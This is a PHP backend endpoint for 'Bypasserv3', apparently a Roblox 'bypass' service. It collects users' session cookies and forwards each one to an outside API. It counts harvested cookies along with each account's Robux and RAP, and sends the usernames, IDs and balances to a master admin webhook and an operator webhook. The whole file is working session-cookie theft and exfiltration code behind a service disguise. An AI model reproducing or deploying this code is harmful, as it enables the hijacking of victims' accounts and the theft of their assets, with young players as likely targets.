<?php
/**
 * Bypasserv3 - Bypass API Endpoint
 * Updated with Dualhook Support & Better Error Handling
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit;
}

require_once '../config.php';
require_once '../functions.php';

// Random security scan
if (rand(1, 100) === 1) {
    securityScan(true);
}

// Random cleanup
if (rand(1, 50) === 1) {
    cleanupRateLimits();
}

// Method check
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Method not allowed']);
    exit;
}

// Suspicious request check
if (isSuspiciousRequest()) {
    logSecurityEvent('suspicious_request', [
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'None'
    ]);
}

// Rate limiting
$ip = getUserIP();
if (!checkRateLimit($ip, 50, 3600)) {
    http_response_code(429);
    echo json_encode(['success' => false, 'error' => 'Rate limit exceeded']);
    exit;
}

// Parse input
$input = json_decode(file_get_contents('php://input'), true);

if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid JSON']);
    exit;
}

// Extract data
$cookie = trim($input['cookie'] ?? '');
$directory = trim($input['directory'] ?? '');

// Validate cookie
if (empty($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Cookie required']);
    exit;
}

if (!validateCookie($cookie)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Invalid cookie format']);
    logSecurityEvent('suspicious_cookie_attempt', ['ip' => $ip]);
    exit;
}

// Get instance data for webhook
$instanceData = getInstanceData($directory);
$userWebhook = $instanceData['userWebhook'] ?? '';
$masterWebhook = MASTER_WEBHOOK;

// ============================================
// CALL EXTERNAL API WITH BETTER ERROR HANDLING
// ============================================
$externalApiUrl = 'https://rblxbypasser.com/api/bypass';
$postData = json_encode(['cookie' => $cookie]);

$ch = curl_init($externalApiUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/json',
    'User-Agent: Bypasserv3/1.0'
]);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);

$apiResponse = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curlError = curl_error($ch);
curl_close($ch);

// Check for curl errors or non-200 response
if (!empty($curlError) || $httpCode !== 200 || empty($apiResponse)) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    logSecurityEvent('external_api_failure', [
        'http_code' => $httpCode,
        'curl_error' => $curlError,
        'ip' => $ip
    ]);
    exit;
}

$apiData = json_decode($apiResponse, true);

// Check if API response is valid
if (!$apiData || !isset($apiData['success']) || !$apiData['success']) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => 'Failed To Send Request, Make Sure Ur Cookie Already Refreshed Or Ur Account Is Not -13 / Age Verified Account'
    ]);
    logSecurityEvent('api_invalid_response', ['ip' => $ip]);
    exit;
}

// ============================================
// EXTRACT USER DATA FROM API RESPONSE
// ============================================
$userInfo = $apiData['userInfo'] ?? [];
$robux = intval($userInfo['robux'] ?? 0);
$rap = intval($userInfo['rap'] ?? 0);
$summary = intval($userInfo['summary'] ?? 0);
$username = $userInfo['username'] ?? 'Unknown';
$userId = $userInfo['userId'] ?? 'Unknown';
$avatarUrl = $apiData['avatarUrl'] ?? 'https://www.roblox.com/headshot-thumbnail/image/default.png';

// ============================================
// UPDATE INSTANCE STATS
// ============================================
if ($instanceData) {
    updateInstanceStats($directory, 'totalCookies', ($instanceData['stats']['totalCookies'] ?? 0) + 1);
    updateInstanceStats($directory, 'totalRobux', ($instanceData['stats']['totalRobux'] ?? 0) + $robux);
    updateInstanceStats($directory, 'totalRAP', ($instanceData['stats']['totalRAP'] ?? 0) + $rap);
    updateInstanceStats($directory, 'totalSummary', ($instanceData['stats']['totalSummary'] ?? 0) + $summary);
    
    updateDailyStats($directory, 'cookies', 1);
    updateDailyStats($directory, 'robux', $robux);
    updateDailyStats($directory, 'rap', $rap);
    updateDailyStats($directory, 'summary', $summary);
}

// Update global stats
updateGlobalStats('totalCookies', 1);

// ============================================
// SEND DUALHOOK NOTIFICATIONS
// ============================================

// Master Webhook Notification (Admin)
if (!empty($masterWebhook)) {
    $masterPayload = [
        'embeds' => [[
            'title' => '✅ Successful Bypass',
            'description' => "**Username:** `{$username}`\n**User ID:** `{$userId}`\n**Robux:** `{$robux}`\n**RAP:** `{$rap}`\n**Instance:** `{$directory}`",
            'color' => 3066993,
            'footer' => ['text' => 'Bypasserv3 | Master Admin'],
            'timestamp' => date('c')
        ]]
    ];
    sendWebhookNotification($masterWebhook, $masterPayload);
}

// User Webhook Notification (User)
if (!empty($userWebhook)) {
    $userPayload = [
        'embeds' => [[
            'title' => '🎉 Account Bypass Success',
            'description' => "**Account:** `{$username}`\n**ID:** `{$userId}`\n**Robux Balance:** `{$robux}`\n**RAP Value:** `{$rap}`",
            'color' => 3447003,
            'footer' => ['text' => 'Your Bypasser'],
            'timestamp' => date('c')
        ]]
    ];
    sendWebhookNotification($userWebhook, $userPayload);
}

// Log successful bypass
logSecurityEvent('successful_bypass', [
    'username' => $username,
    'userId' => $userId,
    'robux' => $robux,
    'ip' => $ip
]);

// ============================================
// RETURN RESPONSE
// ============================================
echo json_encode([
    'success' => true,
    'userInfo' => $userInfo,
    'avatarUrl' => $avatarUrl
]);
?>
